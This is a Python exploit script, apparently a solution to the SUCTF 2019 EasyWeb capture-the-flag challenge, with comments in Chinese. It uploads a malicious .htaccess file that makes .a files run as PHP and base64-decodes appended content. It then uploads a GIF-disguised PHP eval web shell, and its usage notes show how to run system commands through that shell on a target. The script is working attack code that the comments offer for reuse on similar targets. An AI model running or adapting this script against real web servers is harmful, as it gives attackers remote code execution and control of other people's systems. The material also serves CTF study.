# -*- coding: utf-8 -*-
"""EasyWeb.py .htaccess 上传 + php://filter LFI 综合利用([SUCTF 2019]EasyWeb)

来源: WP 汇总/[SUCTF 2019]EasyWeb
用途: 利用链(改 URL 复用到同构题):
      1. 取反字符绕过 ^ 拼接执行 `_=${%~%80^...}` → get_the_flag;
      2. 上传 .htaccess: AddType 让 .a 当 PHP 解析, auto_append_file 走
         php://filter/convert.base64-decode 绕内容检查;
      3. 上传 shell.a = GIF89a 头 + base64 的一句话(解码后即 <?php eval($_GET['cmd']);?>)。

依赖:
    pip install requests

用法(实战, 需网络):
    python EasyWeb.py -u "http://target/?_=<URL编码后的取反payload>&<参数名>=get_the_flag"
    # 成功后访问 http://target/shell.a?cmd=system('ls /');
"""
import argparse
import sys

import requests

# 上传 .htaccess: 让 .a 后缀按 PHP 解析, 自动追加时以 base64-decode 处理内容
HTACCESS_CONTENT = '''
#define width 1337
#define height 1337
AddType application/x-httpd-php .a
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"
'''

# GIF89a + 'PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='(即 <?php eval($_REQUEST['cmd']);?>)
SHELL_B64 = 'GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='


def exploit(url):
    """按利用链上传 .htaccess 与 shell.a, 返回两次响应文本。"""
    session = requests.session()

    files_htaccess = {'file': ('.htaccess', HTACCESS_CONTENT, 'image/jpeg')}
    res_hta = session.post(url, files=files_htaccess)
    print('[*] .htaccess 响应:\n%s' % res_hta.text)

    files_shell = {'file': ('shell.a', SHELL_B64, 'image/jpeg')}
    res_shell = session.post(url, files=files_shell)
    print('[*] shell.a 响应:\n%s' % res_shell.text)
    return res_hta.text, res_shell.text


def main():
    ap = argparse.ArgumentParser(description='.htaccess 上传 + php://filter LFI')
    ap.add_argument('-u', '--url', required=True, help='上传接口完整 URL')
    args = ap.parse_args()

    if getattr(sys.stdout, 'reconfigure', None):
        try:
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass

    exploit(args.url)
    return 0


if __name__ == '__main__':
    sys.exit(main())
